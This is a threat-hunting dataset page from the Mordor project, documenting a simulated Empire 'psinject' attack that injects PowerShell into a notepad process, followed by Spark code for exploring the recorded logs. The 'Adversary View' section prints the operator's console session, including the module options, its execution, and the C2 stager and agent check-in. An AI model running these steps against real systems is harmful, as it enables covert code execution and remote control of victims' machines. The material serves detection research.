# Empire PSInject

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518200432 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/management/Invoke-PSInject.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/empire_psinject.tar.gz |

## Dataset Description
This dataset represents adversaries using Empire psinject script to inject Unmanaged PowerShell into any process.

## Adversary View
```
(Empire: TKV35P8X) > usemodule management/psinject 
(Empire: powershell/management/psinject) > set ProcName notepad
(Empire: powershell/management/psinject) > info   

              Name: Invoke-PSInject
            Module: powershell/management/psinject
        NeedsAdmin: False
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @harmj0y
  @sixdub
  leechristensen (@tifkin_)

Description:
  Utilizes Powershell to to inject a Stephen Fewer formed
  ReflectivePick which executes PS codefrom memory in a remote
  process

Comments:
  http://sixdub.net

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  ProcId     False                                 ProcessID to inject into.               
  ProxyCreds False       default                   Proxy credentials                       
                                                  ([domain\]username:password) to use for 
                                                  request (default, none, or other).      
  Agent      True        TKV35P8X                  Agent to run module on.                 
  Listener   True        https                     Listener to use.                        
  ProcName   False       notepad                   Process name to inject into.            
  Proxy      False       default                   Proxy to use for request (default, none,
                                                  or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                  request (default, none, or other).      

(Empire: powershell/management/psinject) > execute
[*] Tasked TKV35P8X to run TASK_CMD_JOB
[*] Agent TKV35P8X tasked with task ID 13
[*] Tasked agent TKV35P8X to run module powershell/management/psinject
(Empire: powershell/management/psinject) > Job started: BELAKR
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent EMDBFPSY checked in
[+] Initial agent EMDBFPSY from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to EMDBFPSY at 10.0.10.103

(Empire: powershell/management/psinject) > agents 

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 20:06:25  https           
TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 20:06:28  https           
56W8UEHP ps 172.18.39.106   HR001             SHIRE\nmartha           cmd                8572   5/0.0    2019-05-18 20:03:49  https           

EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 20:06:28  https
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/empire_psinject.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        